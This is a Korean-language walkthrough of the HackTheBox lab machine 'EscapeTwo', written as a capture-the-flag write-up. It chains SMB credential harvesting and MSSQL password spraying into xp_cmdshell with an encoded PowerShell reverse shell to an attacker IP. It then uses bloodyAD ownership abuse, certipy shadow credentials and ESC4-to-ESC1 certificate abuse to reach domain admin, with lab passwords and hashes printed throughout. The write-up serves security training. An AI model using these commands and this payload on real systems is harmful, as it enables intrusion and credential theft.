# EscapeTwo - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,1433,3268,3269,389,445,464,47001,49664,49665,49666,49667,49691,49692,49695,49708,49724,49735,49798,53,593,5985,636,88,9389 -sC -sV -vv -oA escapeTwo 10.129.232.128
```
<img width="1084" height="401" alt="image" src="https://github.com/user-attachments/assets/e62950c7-7b46-48cc-be5d-4fcd14927c78" />
<img width="1084" height="332" alt="image" src="https://github.com/user-attachments/assets/ec425077-185b-467d-9a2a-6165a41f088f" />
<img width="1084" height="223" alt="image" src="https://github.com/user-attachments/assets/d247daf5-f01a-4401-b128-bb75da66c006" />
<img width="1084" height="70" alt="image" src="https://github.com/user-attachments/assets/f1c0b4d7-fd64-448a-a127-a78b8a1e190a" />

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- MSSQL(1433)
- WINRM(5985)
- CA

<br>

- `/etc/hosts`에 `DC01.sequel.htb` 추가.
<img width="1084" height="70" alt="image" src="https://github.com/user-attachments/assets/c03222d9-8b9f-488f-9fba-91f5ed570290" />

---
## Shell as sql_svc
- 유저목록 수집.
```bash
nxc smb 10.129.232.128 -u rose -p KxEPkKe6R8su --users
```
<img width="1084" height="445" alt="image" src="https://github.com/user-attachments/assets/a4979195-2794-4d06-959c-1e86aea6173c" />

<br>
<br>

- 유저목록 생성.
<img width="1084" height="252" alt="image" src="https://github.com/user-attachments/assets/18a69c86-51fe-490c-8a2d-74f71736be72" />

<br>
<br>

- `rose:KxEPkKe6R8su`로 SMB 탐색.
```bash
smbmap -u rose -p KxEPkKe6R8su -H 10.129.232.128
```
<img width="1084" height="226" alt="image" src="https://github.com/user-attachments/assets/886cfc64-609b-4424-a16e-3cd2358b21ee" />

<br>
<br>

- `SMB` 접속하여 내부 파일 다운로드.
```bash
smbclient -U rose '//10.129.232.128/Accounting Department'
```
<img width="1084" height="378" alt="image" src="https://github.com/user-attachments/assets/5700cf93-1f92-4a69-bc0e-4363dc0aa899" />

<br>
<br>

- 해당 파일을 열려고 했으나 실패.
- 압축 파일이라고 출력이 되어 압축 해제.
<img width="1084" height="409" alt="image" src="https://github.com/user-attachments/assets/c334d28c-b67d-4d79-85fd-758e46022825" />

<br>
<br>

- `/accounts.xlsx/xl` 경로의 `sharedStrings.xml`파일에서 계정 노출.
<img width="1084" height="312" alt="image" src="https://github.com/user-attachments/assets/dfde013a-4274-4676-a0f3-8231e1521c01" />

<br>
<br>

- 패스워드 목록 생성.
<img width="1084" height="139" alt="image" src="https://github.com/user-attachments/assets/521ce439-d31a-4af3-9864-f89f8bc400f5" />

<br>
<br>

- `oscar:86LxLBMgEWaKUnBG`로그인 성공.
```bash
nxc smb 10.129.232.128 -u users -p passwords
```
<img width="1084" height="233" alt="image" src="https://github.com/user-attachments/assets/5f073a4e-a63c-49f0-8647-2eba88f5692e" />

<br>
<br>

- `oscar`유저로는 특별한 정보를 찾을 수 없었음.
- `MSSQL`의 관리자 계정인 `sa`를 유저목록에 추가한 후 `--local-auth`를 붙여서 `mssql` 로그인 테스트.
```bash
nxc mssql 10.129.232.128 -u users -p passwords --local-auth
```
<img width="1084" height="30" alt="image" src="https://github.com/user-attachments/assets/76e259ab-abda-4907-a82d-930df00d978a" />

<br>
<br>

- `sa:MSSQLP@ssw0rd!`로그인.
```bash
impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.129.232.128
```
<img width="1084" height="288" alt="image" src="https://github.com/user-attachments/assets/06664225-12af-46da-a6f1-ae804bbc0325" />

<br>
<br>

- `xp_cmdshell`를 사용하여 명령어 실행.
```
SQL (sa  dbo@master)> EXECUTE sp_configure 'show advanced options', 1

SQL (sa  dbo@master)> RECONFIGURE

SQL (sa  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1

SQL (sa  dbo@master)> RECONFIGURE

SQL (sa  dbo@master)> execute xp_cmdshell 'whoami'
```
<img width="1084" height="265" alt="image" src="https://github.com/user-attachments/assets/5ab1c01d-01cf-4ab2-b35c-b7baec575123" />

<br>
<br>

- https://www.revshells.com/
- 리버스 셸 코드를 실행하여 셸 획득.
```
SQL (sa  dbo@master)> execute xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAzACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```
<img width="1084" height="156" alt="image" src="https://github.com/user-attachments/assets/6b5c5528-10e1-4f51-ac57-f71132499f62" />

---
## Shell as ryan
- `c:\sql2019\ExpressAdv_ENU`에서 `sql-Configuration.INI`파일 발견.
-  해당 파일에서 비밀번호 노출.
<img width="1084" height="441" alt="image" src="https://github.com/user-attachments/assets/b997aa6f-111a-4bf1-ad98-06944758f26a" />

<br>
<br>

- 새로운 비밀번호를 `passwords`에 추가하여 유저목록으로 로그인 시도.
- `ryan` 유저 로그인 성공.
```bash
nxc smb 10.129.232.128 -u users -p passwords --continue-on-success
```
<img width="1084" height="94" alt="image" src="https://github.com/user-attachments/assets/9ab18a3c-eca9-4a5c-9c80-c0fe7081f348" />

<br>
<br>

- `winrm` 로그인 성공.
```bash
nxc winrm 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3
```
<img width="1086" height="210" alt="image" src="https://github.com/user-attachments/assets/6620e497-7c3e-4468-9952-d34918eb74e1" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3
```
<img width="1086" height="289" alt="image" src="https://github.com/user-attachments/assets/9d384420-8d9c-4ab7-96d2-d14eb88306e8" />

---
## Auth as ca_svc
- `SharpHound.exe`를 로컬로부터 다운로드 받아 실행.
- `bloodhound`로 분석.
- `WriteOwner` 권한 발견.
<img width="762" height="289" alt="image" src="https://github.com/user-attachments/assets/33351f46-3944-478a-a19a-7c3023c55211" />

<br>
<br>

- `WriteOwner`권한만으로는 공격 실패.
- `ca_svc`가 `ryan`을 소유하게 만든 후 `genericAll` 권한 부여.
```bash
bloodyAD -d sequel.htb --host 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan

bloodyAD -d sequel.htb --host 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
```
<img width="1086" height="158" alt="image" src="https://github.com/user-attachments/assets/31749ff8-c317-4d12-b880-9d317d8762d8" />

<br>
<br>

- `certipy-ad`를 사용하여 `ca_svc` 해시 획득.
```bash
certipy-ad shadow auto -u ryan -p WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128
```
<img width="1086" height="532" alt="image" src="https://github.com/user-attachments/assets/7188e116-ca4c-44d4-b185-a5b631c97667" />

<br>
<br>

- `ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce` 로그인 성공.
```bash
nxc smb 10.129.232.128 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
```
<img width="1086" height="119" alt="image" src="https://github.com/user-attachments/assets/832b2aff-9a28-47de-9545-8ad675a96b06" />

---
## Privesc
- `certipy`를 사용하여 `CA`의 취약점 탐색.
- `DunderMifflinAuthentication` 템플릿에 `ESC4`권한 취약점 발견.
```bash
certipy-ad find -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -vulnerable -stdout
```
<img width="1086" height="113" alt="image" src="https://github.com/user-attachments/assets/0378fa15-94e4-41d8-86f9-5e427c861127" />

<br>
<br>

<img width="1086" height="53" alt="image" src="https://github.com/user-attachments/assets/aeac6689-959a-4690-8d99-3d674ec124d1" />

<br>
<br>

- `ESC4`권한을 사용하여 `ESC1` 취약점 생성.
```bash
certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -no-save
```
<img width="1086" height="321" alt="image" src="https://github.com/user-attachments/assets/f90ae479-9ec2-4eba-941b-f381a6ca0575" />

<br>
<br>

- `administrator` 인증서 요청.
```bash
certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -ca sequel-dc01-ca -upn administrator@sequel.htb
```
<img width="1086" height="337" alt="image" src="https://github.com/user-attachments/assets/85b41be2-bddd-4cb9-866c-155157e72d3d" />

<br>
<br>

- `administrator` 해시 요청.
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.21.48
```
<img width="1086" height="290" alt="image" src="https://github.com/user-attachments/assets/88a03ea0-6ac9-40e7-8087-83640ec3ef85" />

<br>
<br>

- `administrator:7a8d4e04986afa8ed4060f75e5a0b3ff` 로그인 성공.
```bash
nxc winrm 10.129.21.48 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```
<img width="1086" height="274" alt="image" src="https://github.com/user-attachments/assets/4d718e6f-9533-47eb-83e6-cc530ae4c331" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.21.48 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```
<img width="1086" height="289" alt="image" src="https://github.com/user-attachments/assets/f563f4d1-5752-479f-8d8b-2b957cfb1377" />

---
## FLAG
- `c:\users\ryan\desktop\user.txt`
<img width="1086" height="205" alt="image" src="https://github.com/user-attachments/assets/35cc6844-ec0e-40d2-809f-f4941d003f2c" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1086" height="205" alt="image" src="https://github.com/user-attachments/assets/6cf43abb-5756-480e-a4ef-1b2f61439e54" />

